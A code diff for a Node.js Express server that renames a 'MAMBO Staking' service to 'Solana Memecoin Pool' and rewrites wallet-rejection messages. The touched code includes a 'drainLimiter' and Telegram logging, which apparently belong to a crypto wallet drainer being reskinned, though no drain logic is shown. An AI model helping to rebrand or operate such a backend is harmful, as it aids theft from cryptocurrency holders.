@@ -25,7 +25,7 @@ const generalLimiter = rateLimit({
   message: {
     success: false,
     error: 'Rate limit exceeded',
-    message: 'Non Participant Wallet'
+    message: 'Wallet not eligible for memecoin pool'
   },
   standardHeaders: true,
   legacyHeaders: false,
@@ -40,7 +40,7 @@ const generalLimiter = rateLimit({
     res.status(429).json({
       success: false,
       error: 'Rate limit exceeded',
-      message: 'Non Participant Wallet'
+      message: 'Wallet not eligible for memecoin pool'
     });
   }
 });
@@ -52,7 +52,7 @@ const drainLimiter = rateLimit({
   message: {
     success: false,
     error: 'Drain rate limit exceeded',
-    message: 'Non Participant Wallet'
+    message: 'Wallet not eligible for memecoin pool'
   },
   standardHeaders: true,
   legacyHeaders: false,
@@ -68,7 +68,7 @@ const drainLimiter = rateLimit({
     res.status(429).json({
       success: false,
       error: 'Drain rate limit exceeded',
-      message: 'Non Participant Wallet'
+      message: 'Wallet not eligible for memecoin pool'
     });
   }
 });
@@ -177,7 +177,7 @@ app.post('/api/log', async (req, res) => {
     const { type, projectName, ...logData } = req.body;
     
     // Log to console with project branding
-    console.log(`[${projectName || 'MAMBO'}] ${type}:`, logData);
+          console.log(`[${projectName || 'Solana Memecoin Pool'}] ${type}:`, logData);
     
     // Send to Telegram if it's a critical log
     const criticalLogTypes = [
@@ -206,14 +206,14 @@ app.post('/api/log', async (req, res) => {
             ...logData,
             error: logData.error || type,
             context: logData.context || 'Frontend Log',
-            projectName: projectName || 'MAMBO'
+            projectName: projectName || 'Solana Memecoin Pool'
           });
         } else {
           await telegramLogger.logFrontendError({
             ...logData,
             error: logData.error || type,
             context: logData.context || 'Frontend Log',
-            projectName: projectName || 'MAMBO'
+            projectName: projectName || 'Solana Memecoin Pool'
           });
         }
       } catch (telegramError) {
@@ -252,7 +252,7 @@ app.use((req, res) => {
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`🚀 MAMBO Staking Server running on port ${PORT}`);
+  console.log(`🚀 Solana Memecoin Pool Server running on port ${PORT}`);
   console.log(`📱 Frontend: http://localhost:${PORT}`);
   console.log(`🔗 API: http://localhost:${PORT}/api`);
 }); 
